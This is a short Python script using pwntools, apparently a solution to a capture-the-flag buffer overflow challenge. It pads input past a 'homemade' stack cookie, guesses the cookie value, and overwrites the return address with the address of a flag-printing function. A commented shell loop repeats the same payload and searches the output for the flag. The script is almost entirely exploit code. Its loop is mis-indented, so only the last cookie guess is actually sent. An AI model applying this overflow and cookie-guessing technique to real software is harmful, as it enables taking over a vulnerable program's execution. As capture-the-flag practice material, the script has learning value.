from pwn import *

p = process('./Bufferoverflow-homemade-cookie-v2')

cat_flag = 0x0804857b
i = 1
for i in range (0, 256):
	payload = b'a'*16 + p32(i) + b'a'*12 + p32(cat_flag)

p.sendline(payload)
p.interactive()

#while true; do python2 -c 'print "a"*16 + "\x30\x00\x00\x00" + "a"*12 + "\x7b\x85\x04\x08"'|./Bufferoverflow-homemade-cookie-v2 | grep KMA; done
